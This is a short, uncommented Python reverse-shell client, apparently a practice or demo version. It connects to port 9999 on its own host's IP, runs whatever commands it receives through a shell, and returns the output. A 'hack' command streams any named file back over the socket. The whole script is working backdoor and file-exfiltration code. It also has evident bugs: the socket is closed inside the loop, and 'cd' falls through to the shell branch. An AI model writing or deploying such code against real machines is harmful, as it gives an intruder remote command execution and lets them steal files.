
import socket
import subprocess
import os

s = socket.socket()
name = socket.gethostname()
IP = socket.gethostbyname(name)
s.connect((IP,9999))

while True:

    a = s.recv(1024)
    cmd = a.decode()
    cmd = cmd.split(" ")
    if cmd[0] == "cd":
        os.chdir(cmd[1])
    if cmd[0] == "hack":
        a = open(cmd[1],'rb')
        content = a.read(1024)
        while content:
            s.send(content)
            content = a.read(1024)
        a.close()
    else:
        obj = subprocess.Popen(" ".join(cmd),shell=True,stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
        out = obj.stdout.read()
        out = out.decode() + os.getcwd()
        s.send(out.encode())
    s.close()





